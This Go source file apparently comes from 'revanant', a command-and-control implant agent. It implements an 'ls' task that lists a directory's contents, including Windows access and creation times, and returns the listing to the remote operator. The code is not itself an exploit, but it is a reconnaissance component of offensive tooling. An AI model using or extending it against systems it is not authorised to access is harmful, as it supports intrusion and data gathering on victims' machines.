package commands

import (
	"fmt"
	"os"
	"path/filepath"
	"syscall"
	"time"

	"github.com/xcr-19/revanant/Payload_Type/revanant/agent/pkg/utils/structs"
)

type FileData struct {
	Name        string    `json:"name"`
	IsDir       bool      `json:"is_dir"`
	Size        int64     `json:"size"`
	ModTime     time.Time `json:"modify_time"`
	Permissions string    `json:"permissions"`
	AccessTime  time.Time `json:"access_time"`
	CreatedTime time.Time `json:"created_time"`
}

func Ls(task structs.Task) {
	response := task.NewResponse()
	path := "."

	// Check if path argument provided
	if len(task.Params) > 0 {
		path = task.Params
	}

	// Clean and resolve the path
	path = filepath.Clean(path)
	absPath, err := filepath.Abs(path)
	if err != nil {
		response.SetError(fmt.Sprintf("Failed to resolve path: %s", err))
		task.Job.SendResponses <- response
		return
	}

	// Read directory contents
	entries, err := os.ReadDir(absPath)
	if err != nil {
		response.SetError(fmt.Sprintf("Failed to read directory: %s", err))
		task.Job.SendResponses <- response
		return
	}

	var files []FileData
	for _, entry := range entries {
		info, err := entry.Info()
		if err != nil {
			continue
		}

		// Get file times using syscall for Windows
		var accessTime, createTime time.Time
		if sys := info.Sys(); sys != nil {
			if winData, ok := sys.(*syscall.Win32FileAttributeData); ok {
				accessTime = time.Unix(0, winData.LastAccessTime.Nanoseconds())
				createTime = time.Unix(0, winData.CreationTime.Nanoseconds())
			}
		}

		fileData := FileData{
			Name:        info.Name(),
			IsDir:       info.IsDir(),
			Size:        info.Size(),
			ModTime:     info.ModTime(),
			Permissions: info.Mode().String(),
			AccessTime:  accessTime,
			CreatedTime: createTime,
		}
		files = append(files, fileData)
	}

	// Convert to JSON and send response
	response.Completed = true
	response.UserOutput = fmt.Sprintf("Directory listing for: %s\n", absPath)
	response.Data = files

	task.Job.SendResponses <- response
}
